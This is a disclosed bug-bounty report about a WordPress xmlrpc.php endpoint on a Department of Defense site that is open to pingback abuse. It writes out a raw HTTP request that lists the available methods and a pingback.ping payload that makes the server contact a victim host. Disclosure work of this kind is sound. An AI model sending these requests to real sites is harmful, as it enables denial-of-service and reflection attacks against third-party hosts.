# Application level DoS via xmlrpc.php 

## Report Details
- **Report ID**: 787179
- **URL**: https://hackerone.com/reports/787179
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-01T01:31:23.114Z
- **Disclosed**: 2020-05-14T17:52:10.076Z

## Reporter
- **Username**: mohammedadam24
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
#Vulnerability description:

Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website https://████/ has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.

#Vulnerable links: https://█████/xmlrpc.php

In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below. 

POST /xmlrpc.php HTTP/1.1
Host: ███
Accept: */*
Accept-Language: en
Connection: close
Content-Length: 93

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>

## Impact

#Impact:
Notice that a successful response is received showing that the xmlrpc.php file is enabled.
Now, considering the domain https://██████/ the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.

POST /xmlrpc.php HTTP/1.1
Host: ██████
Accept: */*
Accept-Language: en
Connection: close
Content-Length: 235

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://██████/</string></value>
</param>
<param>
<value><string>https://███████/</string></value>
</param>
</params>
</methodCall>

As soon as the above request is sent, the victim host (█████████) gets an entry in its log file with a request originating from the https://█████/ domain verifying the pingback.

#Remediation:

If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.

## Attachments
No attachments
